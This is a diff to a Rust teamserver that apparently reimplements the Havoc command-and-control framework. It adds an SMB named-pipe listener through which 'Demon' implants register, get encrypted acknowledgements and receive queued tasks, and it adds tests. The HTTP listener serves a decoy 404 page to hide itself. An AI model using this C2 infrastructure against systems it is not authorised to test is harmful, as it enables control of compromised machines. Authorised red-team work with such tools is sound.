@@ -1,7 +1,7 @@
 //! Listener lifecycle management for the teamserver.
 
 use std::collections::BTreeMap;
-use std::future::pending;
+use std::io;
 use std::net::IpAddr;
 use std::sync::Arc;
 
@@ -14,6 +14,13 @@ use axum::{Json, Router};
 use axum_server::tls_rustls::RustlsConfig;
 use base64::Engine as _;
 use base64::engine::general_purpose::STANDARD as BASE64_STANDARD;
+use interprocess::local_socket::tokio::Stream as LocalSocketStream;
+use interprocess::local_socket::traits::tokio::Listener as _;
+use interprocess::local_socket::{ListenerOptions, ToFsName as _, ToNsName as _};
+#[cfg(unix)]
+use interprocess::os::unix::local_socket::{AbstractNsUdSocket, FilesystemUdSocket};
+#[cfg(windows)]
+use interprocess::os::windows::local_socket::NamedPipe;
 use red_cell_common::config::Profile;
 use red_cell_common::crypto::{AGENT_IV_LENGTH, AGENT_KEY_LENGTH, encrypt_agent_data};
 use red_cell_common::demon::{
@@ -35,6 +42,7 @@ use serde::{Deserialize, Serialize};
 use serde_json::Value;
 use time::OffsetDateTime;
 use time::format_description::well_known::Rfc3339;
+use tokio::io::{AsyncReadExt, AsyncWriteExt};
 use tokio::net::TcpListener;
 use tokio::sync::{Mutex, RwLock};
 use tokio::task::JoinHandle;
@@ -425,6 +433,7 @@ const DEFAULT_FAKE_404_BODY: &str =
     include_str!("../../../src/Havoc/teamserver/pkg/handlers/404.html");
 const DEFAULT_HTTP_METHOD: &str = "POST";
 const MINIMUM_DEMON_CALLBACK_BYTES: usize = DemonHeader::SERIALIZED_LEN + 8;
+const SMB_PIPE_PREFIX: &str = r"\\.\pipe\";
 const HEADER_VALIDATION_IGNORES: [&str; 2] = ["connection", "accept-encoding"];
 
 #[derive(Clone, Debug)]
@@ -444,6 +453,20 @@ struct HttpListenerState {
 struct ExpectedHeader {
     name: HeaderName,
     expected_value: String,
+}
+
+#[derive(Clone, Debug)]
+struct SmbListenerState {
+    config: SmbListenerConfig,
+    registry: AgentRegistry,
+    parser: DemonPacketParser,
+    events: EventBus,
+}
+
+#[derive(Clone, Debug, PartialEq, Eq)]
+struct ProcessedDemonResponse {
+    agent_id: u32,
+    payload: Vec<u8>,
 }
 
 impl HttpListenerState {
@@ -506,6 +529,17 @@ impl HttpListenerState {
 
     fn callback_bytes_response(&self, body: &[u8]) -> Response {
         build_response(StatusCode::OK, body, &self.response_headers)
+    }
+}
+
+impl SmbListenerState {
+    fn build(config: &SmbListenerConfig, registry: AgentRegistry, events: EventBus) -> Self {
+        Self {
+            config: config.clone(),
+            registry: registry.clone(),
+            parser: DemonPacketParser::new(registry),
+            events,
+        }
     }
 }
 
@@ -840,11 +874,11 @@ fn agent_update_event(agent: &red_cell_common::AgentInfo) -> OperatorMessage {
 }
 
 async fn serialize_job_packages(
-    state: &HttpListenerState,
+    registry: &AgentRegistry,
     agent_id: u32,
     jobs: Vec<crate::Job>,
 ) -> Result<Vec<u8>, ListenerManagerError> {
-    let (key, iv) = decode_agent_crypto(state, agent_id).await?;
+    let (key, iv) = decode_agent_crypto(registry, agent_id).await?;
     let mut packages = Vec::with_capacity(jobs.len());
 
     for job in jobs {
@@ -864,10 +898,10 @@ async fn serialize_job_packages(
 }
 
 async fn decode_agent_crypto(
-    state: &HttpListenerState,
+    registry: &AgentRegistry,
     agent_id: u32,
 ) -> Result<([u8; AGENT_KEY_LENGTH], [u8; AGENT_IV_LENGTH]), ListenerManagerError> {
-    let encryption = state.registry.encryption(agent_id).await?;
+    let encryption = registry.encryption(agent_id).await?;
     let key = decode_fixed(agent_id, "aes_key", encryption.aes_key.as_bytes(), AGENT_KEY_LENGTH)?;
     let iv = decode_fixed(agent_id, "aes_iv", encryption.aes_iv.as_bytes(), AGENT_IV_LENGTH)?;
     Ok((key, iv))
@@ -880,7 +914,9 @@ fn callback_protocol_error(error: DemonProtocolError) -> ListenerManagerError {
 }
 
 async fn build_callback_response(
-    state: &HttpListenerState,
+    listener_name: &str,
+    registry: &AgentRegistry,
+    events: &EventBus,
     agent_id: u32,
     packages: Vec<crate::DemonCallbackPackage>,
 ) -> Result<Vec<u8>, ListenerManagerError> {
@@ -897,12 +933,12 @@ async fn build_callback_response(
                         message: format!("failed to format callback timestamp: {error}"),
                     }
                 })?;
-                let agent = state.registry.set_last_call_in(agent_id, timestamp).await?;
-                state.events.broadcast(agent_update_event(&agent));
+                let agent = registry.set_last_call_in(agent_id, timestamp).await?;
+                events.broadcast(agent_update_event(&agent));
             }
             Ok(command) => {
                 debug!(
-                    listener = %state.config.name,
+                    listener = listener_name,
                     agent_id = format_args!("{agent_id:08X}"),
                     ?command,
                     "ignoring unhandled demon callback command"
@@ -910,7 +946,7 @@ async fn build_callback_response(
             }
             Err(error) => {
                 warn!(
-                    listener = %state.config.name,
+                    listener = listener_name,
                     agent_id = format_args!("{agent_id:08X}"),
                     %error,
                     command_id = package.command_id,
@@ -924,12 +960,219 @@ async fn build_callback_response(
         return Ok(Vec::new());
     }
 
-    let jobs = state.registry.dequeue_jobs(agent_id).await?;
+    let jobs = registry.dequeue_jobs(agent_id).await?;
     if jobs.is_empty() {
         return Ok(Vec::new());
     }
 
-    serialize_job_packages(state, agent_id, jobs).await
+    serialize_job_packages(registry, agent_id, jobs).await
+}
+
+async fn process_demon_transport(
+    listener_name: &str,
+    registry: &AgentRegistry,
+    parser: &DemonPacketParser,
+    events: &EventBus,
+    body: &[u8],
+    external_ip: String,
+) -> Result<ProcessedDemonResponse, ListenerManagerError> {
+    match parser.parse(body, external_ip).await {
+        Ok(ParsedDemonPacket::Init(init)) => {
+            let response =
+                build_init_ack(init.agent.agent_id, &init.agent.encryption).map_err(|error| {
+                    ListenerManagerError::InvalidConfig {
+                        message: format!("failed to build demon init ack: {error}"),
+                    }
+                })?;
+
+            events.broadcast(agent_new_event(listener_name, init.header.magic, &init.agent));
+            Ok(ProcessedDemonResponse { agent_id: init.agent.agent_id, payload: response })
+        }
+        Ok(ParsedDemonPacket::Reconnect { header, .. }) => {
+            let payload = if let Some(agent) = registry.get(header.agent_id).await {
+                build_init_ack(header.agent_id, &agent.encryption).map_err(|error| {
+                    ListenerManagerError::InvalidConfig {
+                        message: format!("failed to build reconnect ack: {error}"),
+                    }
+                })?
+            } else {
+                Vec::new()
+            };
+
+            Ok(ProcessedDemonResponse { agent_id: header.agent_id, payload })
+        }
+        Ok(ParsedDemonPacket::Callback { header, packages }) => {
+            let payload =
+                build_callback_response(listener_name, registry, events, header.agent_id, packages)
+                    .await?;
+
+            Ok(ProcessedDemonResponse { agent_id: header.agent_id, payload })
+        }
+        Err(error) => Err(ListenerManagerError::InvalidConfig {
+            message: format!("failed to parse demon callback: {error}"),
+        }),
+    }
+}
+
+async fn spawn_smb_listener_runtime(
+    config: &SmbListenerConfig,
+    registry: AgentRegistry,
+    events: EventBus,
+) -> Result<JoinHandle<()>, ListenerManagerError> {
+    let state = Arc::new(SmbListenerState::build(config, registry, events));
+    let listener_name = normalized_smb_pipe_name(&config.pipe_name);
+    let socket_name = smb_local_socket_name(&config.pipe_name).map_err(|error| {
+        ListenerManagerError::StartFailed {
+            name: config.name.clone(),
+            message: format!("failed to resolve SMB pipe `{listener_name}`: {error}"),
+        }
+    })?;
+    let listener = ListenerOptions::new().name(socket_name).create_tokio().map_err(|error| {
+        ListenerManagerError::StartFailed {
+            name: config.name.clone(),
+            message: format!("failed to bind SMB pipe `{listener_name}`: {error}"),
+        }
+    })?;
+
+    Ok(tokio::spawn(async move {
+        loop {
+            match listener.accept().await {
+                Ok(stream) => {
+                    let state = state.clone();
+                    tokio::spawn(async move {
+                        handle_smb_connection(state, stream).await;
+                    });
+                }
+                Err(error) => {
+                    warn!(listener = %state.config.name, pipe = %listener_name, %error, "smb listener exited");
+                    break;
+                }
+            }
+        }
+    }))
+}
+
+async fn handle_smb_connection(state: Arc<SmbListenerState>, mut stream: LocalSocketStream) {
+    loop {
+        let frame = match read_smb_frame(&mut stream).await {
+            Ok(Some(frame)) => frame,
+            Ok(None) => break,
+            Err(error) => {
+                warn!(listener = %state.config.name, %error, "failed to read smb frame");
+                break;
+            }
+        };
+
+        if !is_valid_demon_callback_request(&frame.payload) {
+            warn!(
+                listener = %state.config.name,
+                agent_id = format_args!("{:08X}", frame.agent_id),
+                "ignoring invalid smb demon frame"
+            );
+            continue;
+        }
+
+        match process_demon_transport(
+            &state.config.name,
+            &state.registry,
+            &state.parser,
+            &state.events,
+            &frame.payload,
+            "127.0.0.1".to_owned(),
+        )
+        .await
+        {
+            Ok(response) => {
+                if response.payload.is_empty() {
+                    continue;
+                }
+
+                if let Err(error) =
+                    write_smb_frame(&mut stream, response.agent_id, &response.payload).await
+                {
+                    warn!(
+                        listener = %state.config.name,
+                        agent_id = format_args!("{:08X}", response.agent_id),
+                        %error,
+                        "failed to write smb response"
+                    );
+                    break;
+                }
+            }
+            Err(error) => {
+                warn!(
+                    listener = %state.config.name,
+                    agent_id = format_args!("{:08X}", frame.agent_id),
+                    %error,
+                    "failed to process smb demon frame"
+                );
+            }
+        }
+    }
+}
+
+#[derive(Debug)]
+struct SmbFrame {
+    agent_id: u32,
+    payload: Vec<u8>,
+}
+
+async fn read_smb_frame(stream: &mut LocalSocketStream) -> io::Result<Option<SmbFrame>> {
+    let agent_id = match stream.read_u32_le().await {
+        Ok(agent_id) => agent_id,
+        Err(error) if error.kind() == io::ErrorKind::UnexpectedEof => return Ok(None),
+        Err(error) => return Err(error),
+    };
+    let payload_len = match stream.read_u32_le().await {
+        Ok(length) => length,
+        Err(error) if error.kind() == io::ErrorKind::UnexpectedEof => return Ok(None),
+        Err(error) => return Err(error),
+    };
+    let payload_len = usize::try_from(payload_len).map_err(|_| {
+        io::Error::new(io::ErrorKind::InvalidData, "smb frame payload length overflowed usize")
+    })?;
+    let mut payload = vec![0_u8; payload_len];
+    stream.read_exact(&mut payload).await?;
+    Ok(Some(SmbFrame { agent_id, payload }))
+}
+
+async fn write_smb_frame(
+    stream: &mut LocalSocketStream,
+    agent_id: u32,
+    payload: &[u8],
+) -> io::Result<()> {
+    let payload_len = u32::try_from(payload.len()).map_err(|_| {
+        io::Error::new(io::ErrorKind::InvalidInput, "smb frame payload exceeds u32 length")
+    })?;
+    stream.write_u32_le(agent_id).await?;
+    stream.write_u32_le(payload_len).await?;
+    stream.write_all(payload).await?;
+    stream.flush().await
+}
+
+fn normalized_smb_pipe_name(pipe_name: &str) -> String {
+    let trimmed = pipe_name.trim();
+    if trimmed.starts_with('/') || trimmed.starts_with(r"\\") {
+        trimmed.to_owned()
+    } else {
+        format!("{SMB_PIPE_PREFIX}{trimmed}")
+    }
+}
+
+#[cfg(unix)]
+fn smb_local_socket_name(pipe_name: &str) -> io::Result<interprocess::local_socket::Name<'static>> {
+    if pipe_name.trim_start().starts_with('/') {
+        pipe_name.to_fs_name::<FilesystemUdSocket>().map(|name| name.into_owned())
+    } else {
+        normalized_smb_pipe_name(pipe_name)
+            .to_ns_name::<AbstractNsUdSocket>()
+            .map(|name| name.into_owned())
+    }
+}
+
+#[cfg(windows)]
+fn smb_local_socket_name(pipe_name: &str) -> io::Result<interprocess::local_socket::Name<'static>> {
+    normalized_smb_pipe_name(pipe_name).to_fs_name::<NamedPipe>().map(|name| name.into_owned())
 }
 
 fn decode_fixed<const N: usize>(
@@ -966,8 +1209,12 @@ impl ListenerManager {
                 )
                 .await
             }
-            ListenerConfig::Smb(_) | ListenerConfig::External(_) => Ok(tokio::spawn(async move {
-                pending::<()>().await;
+            ListenerConfig::Smb(config) => {
+                spawn_smb_listener_runtime(config, self.agent_registry.clone(), self.events.clone())
+                    .await
+            }
+            ListenerConfig::External(_) => Ok(tokio::spawn(async move {
+                std::future::pending::<()>().await;
             })),
         }
     }
@@ -1047,52 +1294,20 @@ async fn http_listener_handler(
         return state.fake_404_response();
     }
 
-    match state.parser.parse(&body, external_ip).await {
-        Ok(ParsedDemonPacket::Init(init)) => {
-            let response = match build_init_ack(init.agent.agent_id, &init.agent.encryption) {
-                Ok(response) => response,
-                Err(error) => {
-                    warn!(listener = %state.config.name, %error, "failed to build demon init ack");
-                    return state.fake_404_response();
-                }
-            };
-
-            state.events.broadcast(agent_new_event(
-                &state.config.name,
-                init.header.magic,
-                &init.agent,
-            ));
-            state.callback_bytes_response(&response)
-        }
-        Ok(ParsedDemonPacket::Reconnect { header, .. }) => {
-            let Some(agent) = state.registry.get(header.agent_id).await else {
-                return state.callback_placeholder_response();
-            };
-
-            match build_init_ack(header.agent_id, &agent.encryption) {
-                Ok(response) => state.callback_bytes_response(&response),
-                Err(error) => {
-                    warn!(listener = %state.config.name, %error, "failed to build reconnect ack");
-                    state.fake_404_response()
-                }
-            }
-        }
-        Ok(ParsedDemonPacket::Callback { header, packages }) => {
-            match build_callback_response(&state, header.agent_id, packages).await {
-                Ok(response) => state.callback_bytes_response(&response),
-                Err(error) => {
-                    warn!(
-                        listener = %state.config.name,
-                        agent_id = format_args!("{:08X}", header.agent_id),
-                        %error,
-                        "failed to process demon callback"
-                    );
-                    state.fake_404_response()
-                }
-            }
-        }
+    match process_demon_transport(
+        &state.config.name,
+        &state.registry,
+        &state.parser,
+        &state.events,
+        &body,
+        external_ip,
+    )
+    .await
+    {
+        Ok(response) if response.payload.is_empty() => state.callback_placeholder_response(),
+        Ok(response) => state.callback_bytes_response(&response.payload),
         Err(error) => {
-            warn!(listener = %state.config.name, %error, "failed to parse demon callback");
+            warn!(listener = %state.config.name, %error, "failed to process demon callback");
             state.fake_404_response()
         }
     }
@@ -1363,23 +1578,30 @@ fn proxy_from_operator(
 mod tests {
     use std::net::TcpListener as StdTcpListener;
     use std::time::Duration;
+    use std::time::{SystemTime, UNIX_EPOCH};
 
     use super::{
         ListenerEventAction, ListenerManager, ListenerManagerError, ListenerStatus,
         action_from_mark, listener_config_from_operator, operator_requests_start,
+        smb_local_socket_name,
     };
     use crate::{AgentRegistry, Database, EventBus, Job};
     use axum::http::StatusCode;
     use base64::Engine as _;
     use base64::engine::general_purpose::STANDARD as BASE64_STANDARD;
+    use interprocess::local_socket::tokio::Stream as LocalSocketStream;
+    use interprocess::local_socket::traits::tokio::Stream as _;
     use red_cell_common::AgentEncryptionInfo;
     use red_cell_common::crypto::{
         AGENT_IV_LENGTH, AGENT_KEY_LENGTH, decrypt_agent_data, encrypt_agent_data,
     };
     use red_cell_common::demon::{DemonCommand, DemonEnvelope, DemonMessage};
     use red_cell_common::operator::{ListenerInfo, OperatorMessage};
-    use red_cell_common::{HttpListenerConfig, HttpListenerResponseConfig, ListenerConfig};
+    use red_cell_common::{
+        HttpListenerConfig, HttpListenerResponseConfig, ListenerConfig, SmbListenerConfig,
+    };
     use reqwest::Client;
+    use tokio::io::{AsyncReadExt, AsyncWriteExt};
     use tokio::time::sleep;
 
     fn http_listener(name: &str, port: u16) -> ListenerConfig {
@@ -1402,6 +1624,15 @@ mod tests {
             cert: None,
             response: None,
             proxy: None,
+        })
+    }
+
+    fn smb_listener(name: &str, pipe_name: &str) -> ListenerConfig {
+        ListenerConfig::from(SmbListenerConfig {
+            name: name.to_owned(),
+            pipe_name: pipe_name.to_owned(),
+            kill_date: None,
+            working_hours: None,
         })
     }
 
@@ -1814,6 +2045,123 @@ mod tests {
         Ok(())
     }
 
+    #[tokio::test]
+    async fn smb_listener_registers_demon_init_and_returns_framed_ack()
+    -> Result<(), Box<dyn std::error::Error>> {
+        let database = Database::connect_in_memory().await?;
+        let registry = AgentRegistry::new(database.clone());
+        let events = EventBus::default();
+        let manager = ListenerManager::new(database.clone(), registry.clone(), events.clone());
+        let mut event_receiver = events.subscribe();
+        let pipe_name = unique_smb_pipe_name("init");
+
+        manager.create(smb_listener("edge-smb-init", &pipe_name)).await?;
+        manager.start("edge-smb-init").await?;
+        wait_for_smb_listener(&pipe_name).await?;
+
+        let key = [0x41; AGENT_KEY_LENGTH];
+        let iv = [0x24; AGENT_IV_LENGTH];
+        let mut stream = connect_smb_stream(&pipe_name).await?;
+        write_test_smb_frame(
+            &mut stream,
+            0x1234_5678,
+            &valid_demon_init_body(0x1234_5678, key, iv),
+        )
+        .await?;
+
+        let (agent_id, response) = read_test_smb_frame(&mut stream).await?;
+        assert_eq!(agent_id, 0x1234_5678);
+        let decrypted = decrypt_agent_data(&key, &iv, &response)?;
+        assert_eq!(decrypted.as_slice(), &0x1234_5678_u32.to_le_bytes());
+
+        let stored = registry.get(0x1234_5678).await.expect("agent should be registered");
+        assert_eq!(stored.hostname, "wkstn-01");
+        assert_eq!(stored.external_ip, "127.0.0.1");
+        assert_eq!(database.agents().get(0x1234_5678).await?, Some(stored.clone()));
+
+        let event = event_receiver.recv().await.expect("agent registration should broadcast");
+        let OperatorMessage::AgentNew(message) = event else {
+            panic!("unexpected operator event");
+        };
+        assert_eq!(message.info.listener, "edge-smb-init");
+
+        manager.stop("edge-smb-init").await?;
+        Ok(())
+    }
+
+    #[tokio::test]
+    async fn smb_listener_serializes_all_queued_jobs_for_get_job()
+    -> Result<(), Box<dyn std::error::Error>> {
+        let database = Database::connect_in_memory().await?;
+        let registry = AgentRegistry::new(database.clone());
+        let manager = ListenerManager::new(database, registry.clone(), EventBus::default());
+        let pipe_name = unique_smb_pipe_name("jobs");
+        let key = [0x61; AGENT_KEY_LENGTH];
+        let iv = [0x27; AGENT_IV_LENGTH];
+        let agent_id = 0x5566_7788;
+
+        registry.insert(sample_agent_info(agent_id, key, iv)).await?;
+        registry
+            .enqueue_job(
+                agent_id,
+                Job {
+                    command: u32::from(DemonCommand::CommandSleep),
+                    request_id: 41,
+                    payload: vec![1, 2, 3, 4],
+                    command_line: "sleep 10".to_owned(),
+                    task_id: "task-41".to_owned(),
+                    created_at: "2026-03-09T20:10:00Z".to_owned(),
+                },
+            )
+            .await?;
+        registry
+            .enqueue_job(
+                agent_id,
+                Job {
+                    command: u32::from(DemonCommand::CommandCheckin),
+                    request_id: 42,
+                    payload: vec![5, 6, 7],
+                    command_line: "checkin".to_owned(),
+                    task_id: "task-42".to_owned(),
+                    created_at: "2026-03-09T20:11:00Z".to_owned(),
+                },
+            )
+            .await?;
+        manager.create(smb_listener("edge-smb-jobs", &pipe_name)).await?;
+        manager.start("edge-smb-jobs").await?;
+        wait_for_smb_listener(&pipe_name).await?;
+
+        let mut stream = connect_smb_stream(&pipe_name).await?;
+        write_test_smb_frame(
+            &mut stream,
+            agent_id,
+            &valid_demon_callback_body(
+                agent_id,
+                key,
+                iv,
+                u32::from(DemonCommand::CommandGetJob),
+                9,
+                &[],
+            ),
+        )
+        .await?;
+
+        let (response_agent_id, response_bytes) = read_test_smb_frame(&mut stream).await?;
+        assert_eq!(response_agent_id, agent_id);
+        let message = DemonMessage::from_bytes(response_bytes.as_ref())?;
+        assert_eq!(message.packages.len(), 2);
+        assert_eq!(message.packages[0].command_id, u32::from(DemonCommand::CommandSleep));
+        assert_eq!(message.packages[0].request_id, 41);
+        assert_eq!(decrypt_agent_data(&key, &iv, &message.packages[0].payload)?, vec![1, 2, 3, 4]);
+        assert_eq!(message.packages[1].command_id, u32::from(DemonCommand::CommandCheckin));
+        assert_eq!(message.packages[1].request_id, 42);
+        assert_eq!(decrypt_agent_data(&key, &iv, &message.packages[1].payload)?, vec![5, 6, 7]);
+        assert!(registry.queued_jobs(agent_id).await?.is_empty());
+
+        manager.stop("edge-smb-jobs").await?;
+        Ok(())
+    }
+
     #[test]
     fn operator_payload_maps_to_http_listener_config() -> Result<(), ListenerManagerError> {
         let info = ListenerInfo {
@@ -1840,6 +2188,27 @@ mod tests {
                 assert_eq!(config.name, "alpha");
                 assert!(config.secure);
                 assert_eq!(config.hosts, vec!["a.example".to_owned(), "b.example".to_owned()]);
+            }
+            other => panic!("unexpected config: {other:?}"),
+        }
+
+        Ok(())
+    }
+
+    #[test]
+    fn operator_payload_maps_to_smb_listener_config() -> Result<(), ListenerManagerError> {
+        let mut info = ListenerInfo {
+            name: Some("pivot".to_owned()),
+            protocol: Some("SMB".to_owned()),
+            ..ListenerInfo::default()
+        };
+        info.extra.insert("PipeName".to_owned(), serde_json::json!(r"pivot-01"));
+
+        let config = listener_config_from_operator(&info)?;
+        match config {
+            ListenerConfig::Smb(config) => {
+                assert_eq!(config.name, "pivot");
+                assert_eq!(config.pipe_name, "pivot-01");
             }
             other => panic!("unexpected config: {other:?}"),
         }
@@ -1879,6 +2248,57 @@ mod tests {
         }
 
         Err(format!("listener on port {port} did not become ready").into())
+    }
+
+    async fn wait_for_smb_listener(pipe_name: &str) -> Result<(), Box<dyn std::error::Error>> {
+        for _ in 0..40 {
+            match connect_smb_stream(pipe_name).await {
+                Ok(stream) => {
+                    drop(stream);
+                    return Ok(());
+                }
+                Err(_) => sleep(Duration::from_millis(25)).await,
+            }
+        }
+
+        Err(format!("smb listener `{pipe_name}` did not become ready").into())
+    }
+
+    async fn connect_smb_stream(
+        pipe_name: &str,
+    ) -> Result<LocalSocketStream, Box<dyn std::error::Error>> {
+        let socket_name = smb_local_socket_name(pipe_name)?;
+        Ok(LocalSocketStream::connect(socket_name).await?)
+    }
+
+    async fn write_test_smb_frame(
+        stream: &mut LocalSocketStream,
+        agent_id: u32,
+        payload: &[u8],
+    ) -> Result<(), Box<dyn std::error::Error>> {
+        stream.write_u32_le(agent_id).await?;
+        stream.write_u32_le(u32::try_from(payload.len())?).await?;
+        stream.write_all(payload).await?;
+        stream.flush().await?;
+        Ok(())
+    }
+
+    async fn read_test_smb_frame(
+        stream: &mut LocalSocketStream,
+    ) -> Result<(u32, Vec<u8>), Box<dyn std::error::Error>> {
+        let agent_id = stream.read_u32_le().await?;
+        let payload_len = usize::try_from(stream.read_u32_le().await?)?;
+        let mut payload = vec![0_u8; payload_len];
+        stream.read_exact(&mut payload).await?;
+        Ok((agent_id, payload))
+    }
+
+    fn unique_smb_pipe_name(suffix: &str) -> String {
+        let unique = SystemTime::now()
+            .duration_since(UNIX_EPOCH)
+            .map(|duration| duration.as_nanos())
+            .unwrap_or_default();
+        format!("red-cell-test-{suffix}-{unique}")
     }
 
     fn valid_demon_request_body(agent_id: u32) -> Vec<u8> {
